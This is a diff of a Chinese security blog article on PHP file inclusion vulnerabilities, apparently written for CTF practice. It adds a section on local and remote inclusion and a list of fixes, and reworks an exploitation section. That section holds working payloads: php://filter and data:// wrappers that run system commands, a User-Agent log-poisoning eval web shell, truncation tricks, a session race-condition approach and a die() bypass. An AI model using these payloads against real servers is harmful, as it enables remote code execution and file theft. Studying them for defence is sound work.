@@ -5,7 +5,7 @@
 <head>
     <meta charset="utf-8">
     <meta name="keywords" content="文件包含, Robin">
-    <meta name="description" content="概念文件包含漏洞是指应用程序在处理文件路径时，没有进行足够的验证导致攻击者可以利用此漏洞读取任意文件，执行任意代码甚至获取系统权限。 
+    <meta name="description" content="原理文件包含漏洞是指应用程序在处理文件路径时，没有进行足够的验证导致攻击者可以利用此漏洞读取任意文件，执行任意代码甚至获取系统权限。 
 这种漏洞通常出现在应用程序中动态引用文件的代码中或是出现在用户可以控制文件名、文件路径或文件内容的输入参">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -403,14 +403,14 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2023-04-18
+                    2023-07-07
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.3k
+                    1.5k
                 </div>
                 
 
@@ -437,18 +437,21 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h4 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h4><p>文件包含漏洞是指应用程序在处理文件路径时，没有进行足够的验证<br>导致攻击者可以利用此漏洞读取任意文件，执行任意代码甚至获取系统权限。 </p>
+                <h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>文件包含漏洞是指应用程序在处理文件路径时，没有进行足够的验证<br>导致攻击者可以利用此漏洞读取任意文件，执行任意代码甚至获取系统权限。 </p>
 <p>这种漏洞通常出现在应用程序中动态引用文件的代码中<br>或是出现在用户可以控制文件名、文件路径或文件内容的输入参数上。<br>攻击者可以在这些参数中注入特定的字符，从而构造一个恶意文件路径并被应用程序读取<br>应用程序没有对这个路径进行验证，最终导致攻击者可以获取系统权限或读取任意文件。 </p>
-<p>在开发应用程序时，需要对文件路径进行验证<br>并遵循最小权限原则，确保应用程序具有最小的访问权限。<br>此外，使用白名单或安全沙箱技术也可以帮助防止文件包含漏洞的发生</p>
-<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><pre><code>
-【使用伪协议读取文件】
-参数=php://filter/convert.base64-encode/resource=目标文件
+<h4 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h4><ol>
+<li>本地文件包含</li>
+<li>远程文件包含 ：即加载远程文件，在<code>php.ini</code>中开allow_url_include 、allow_url_fopen选项。开启后可以直接执行任意代码。</li>
+</ol>
+<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>【截断包含】<br>1.%00会被认为是结束符，后面的数据会被直接忽略，导致扩展名截断<br>2.路径长度截断：<br>Windows下目录最大长度为256字节，超出最大长度之后的部分将全部丢弃<br>Linux下目录最大长度为4096字节，超出的部分会被丢弃。<br>使用超长的../1.php或者一直重复../1.php</p>
+<p>【有限制远程文件包含漏洞绕过】<br>使用<code>?</code>或者<code>%23</code>或者<code>%20</code>截断后缀（已编码）</p>
+<p>【使用伪协议读取文件】</p>
+<pre><code>参数=php://filter/convert.base64-encode/resource=目标文件
 file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==    
 file=data://text/plain,&lt;?=`tac f*`;?&gt;
-
-
-【UA注入后日志包含】
-user-ugent:
+</code></pre>
+<p>【UA注入后日志包含】</p>
+<pre><code>user-ugent:
 &lt;?=eval($_POST[cmd]);?&gt;
 访问日志文件:
 ?file=/var/log/nginx/access.log
@@ -456,10 +459,9 @@ user-ugent:
 cmd=system(“ls”);
 在UA中注入编码过的代码不会被浏览器解码
 GET请求的参数在存入PHP之前也不会被解码，但是日志在转发到PHO的端口之前就已经写入日志了。
-
-
-【session临时文件条件竞争】
-在.被过滤后php中唯一能无后缀控制的，只有session文件
+</code></pre>
+<p>【session临时文件条件竞争】</p>
+<pre><code>在.被过滤后php中唯一能无后缀控制的，只有session文件
 当开启session时，服务器会在临时目录下创建session文件来保存会话信息，文件名格式为sess_PHPSESSID。一般的linux会将session保存在下面的的某一个目录下:
      /var/lib/php/
      /var/lib/php/sessions/
@@ -471,10 +473,9 @@ web服务会使用多线程接收用户的请求，以确保能够处理并发�
 并利用PHP_SESSION_UPLOAD_PROGRESS设置文件内容，写入攻击者的命令
 如果成功存入了恶意文件，就能访问该文件并POST执行RCE
 EXP放在了文末
-
-
-【绕过die函数】
-思路:
+</code></pre>
+<p>【绕过die函数】</p>
+<pre><code>思路:
 将die函数的代码语句编码成不能正常执行的命令，然后再将文件内的恶意代码编码成可执行命令。
 首先，base64加秘后会忽略掉一些符号以及中文字体
 (只有+, / , 0-9,a-z,A~Z,其余字符都会被跳过)
@@ -490,6 +491,17 @@ EXP放在了文末
 &lt;?=system(&#39;tac f*.php&#39;);?&gt;  ————&gt;  &lt;?=flfgrz(&#39;gnp s*.cuc&#39;);?&gt;
 &lt;?=flfgrz(&#39;gnp s*.cuc&#39;);?&gt;  ————&gt;  &lt;?=system(&#39;tac f*.php&#39;);?&gt;
 </code></pre>
+<h4 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h4><ol>
+<li>禁止远程文件包含allow_url_include=off</li>
+<li>配置open_basedir=指定目录，限制访问区域。</li>
+<li>过滤../等特殊符号</li>
+<li>修改Apache日志文件的存放地址</li>
+<li>开启魔术引号magic_quotes_qpc=on</li>
+<li>尽量不要使用动态变量调用文件，直接写要包含的文件。</li>
+<li>使用白名单或安全沙箱技术</li>
+<li>遵循最小权限原则，确保应用程序具有最小的访问权限。</li>
+</ol>
+<p><a href="https://smms.app/image/MyvPX9diUcxpwSE" target="_blank"><img src="https://s2.loli.net/2023/07/07/MyvPX9diUcxpwSE.png" ></a></p>
 <p>session文件条件竞争EXP</p>
 <pre><code>
 import requests
@@ -844,7 +856,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">88.9k</span>
+                        class="white-color">93.9k</span>
             
             
             
